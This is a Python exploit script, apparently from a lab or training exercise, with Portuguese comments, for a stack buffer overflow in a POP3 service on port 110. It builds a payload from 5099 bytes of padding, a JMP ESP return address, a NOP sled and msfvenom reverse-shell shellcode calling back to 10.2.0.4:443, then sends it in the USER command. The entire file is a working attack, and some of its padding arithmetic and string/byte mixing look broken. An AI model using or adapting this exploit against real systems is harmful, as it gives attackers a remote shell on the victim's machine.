#!/usr/bin/python
import socket,time

# msf-pattern_offset -q 306F4739 -l 5400 => OffSet = 5099
buf = "A" * 5099

# Colocando o endereco da instrucao JMP ESP em EIP para apontar para o topo da pilha
# JMP ESP = 0x0FA14923 encontrado via mona
# Buffer enviado o endereco do JMP ESP em Little Endian para EIP
eip = "\x23\x49\xA1\x0F"

nop = "\x90" * 20

#msfvenom -p windows/shell_reverse_tcp LHOST=10.2.0.4 LPORT=443 -b "\x00" exitfunc=thread -f python -v shellcode
shellcode =  b""
shellcode += b"\xd9\xf6\xbe\x41\xdc\xf5\x49\xd9\x74\x24\xf4"
shellcode += b"\x58\x2b\xc9\xb1\x52\x83\xe8\xfc\x31\x70\x13"
shellcode += b"\x03\x31\xcf\x17\xbc\x4d\x07\x55\x3f\xad\xd8"
shellcode += b"\x3a\xc9\x48\xe9\x7a\xad\x19\x5a\x4b\xa5\x4f"
shellcode += b"\x57\x20\xeb\x7b\xec\x44\x24\x8c\x45\xe2\x12"
shellcode += b"\xa3\x56\x5f\x66\xa2\xd4\xa2\xbb\x04\xe4\x6c"
shellcode += b"\xce\x45\x21\x90\x23\x17\xfa\xde\x96\x87\x8f"
shellcode += b"\xab\x2a\x2c\xc3\x3a\x2b\xd1\x94\x3d\x1a\x44"
shellcode += b"\xae\x67\xbc\x67\x63\x1c\xf5\x7f\x60\x19\x4f"
shellcode += b"\xf4\x52\xd5\x4e\xdc\xaa\x16\xfc\x21\x03\xe5"
shellcode += b"\xfc\x66\xa4\x16\x8b\x9e\xd6\xab\x8c\x65\xa4"
shellcode += b"\x77\x18\x7d\x0e\xf3\xba\x59\xae\xd0\x5d\x2a"
shellcode += b"\xbc\x9d\x2a\x74\xa1\x20\xfe\x0f\xdd\xa9\x01"
shellcode += b"\xdf\x57\xe9\x25\xfb\x3c\xa9\x44\x5a\x99\x1c"
shellcode += b"\x78\xbc\x42\xc0\xdc\xb7\x6f\x15\x6d\x9a\xe7"
shellcode += b"\xda\x5c\x24\xf8\x74\xd6\x57\xca\xdb\x4c\xff"
shellcode += b"\x66\x93\x4a\xf8\x89\x8e\x2b\x96\x77\x31\x4c"
shellcode += b"\xbf\xb3\x65\x1c\xd7\x12\x06\xf7\x27\x9a\xd3"
shellcode += b"\x58\x77\x34\x8c\x18\x27\xf4\x7c\xf1\x2d\xfb"
shellcode += b"\xa3\xe1\x4e\xd1\xcb\x88\xb5\xb2\xf9\x4e\xb5"
shellcode += b"\x46\x96\x4c\xb5\x47\xdd\xd8\x53\x2d\x31\x8d"
shellcode += b"\xcc\xda\xa8\x94\x86\x7b\x34\x03\xe3\xbc\xbe"
shellcode += b"\xa0\x14\x72\x37\xcc\x06\xe3\xb7\x9b\x74\xa2"
shellcode += b"\xc8\x31\x10\x28\x5a\xde\xe0\x27\x47\x49\xb7"
shellcode += b"\x60\xb9\x80\x5d\x9d\xe0\x3a\x43\x5c\x74\x04"
shellcode += b"\xc7\xbb\x45\x8b\xc6\x4e\xf1\xaf\xd8\x96\xfa"
shellcode += b"\xeb\x8c\x46\xad\xa5\x7a\x21\x07\x04\xd4\xfb"
shellcode += b"\xf4\xce\xb0\x7a\x37\xd1\xc6\x82\x12\xa7\x26"
shellcode += b"\x32\xcb\xfe\x59\xfb\x9b\xf6\x22\xe1\x3b\xf8"
shellcode += b"\xf9\xa1\x5c\x1b\x2b\xdc\xf4\x82\xbe\x5d\x99"
shellcode += b"\x34\x15\xa1\xa4\xb6\x9f\x5a\x53\xa6\xea\x5f"
shellcode += b"\x1f\x60\x07\x12\x30\x05\x27\x81\x31\x0c"
shellcode += "C" * (3000 - len(buf) - len(eip) - len(nop))

payload = buf + eip + nop + shellcode

# Conectando na aplicacao
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(("10.2.0.6", 110))
s.recv(1024)

# Enviando o payload
s.send(b"USER " + payload + b"\r\n")
print (s.recv(1024))
s.send(b"QUIT\r\n")
s.close()
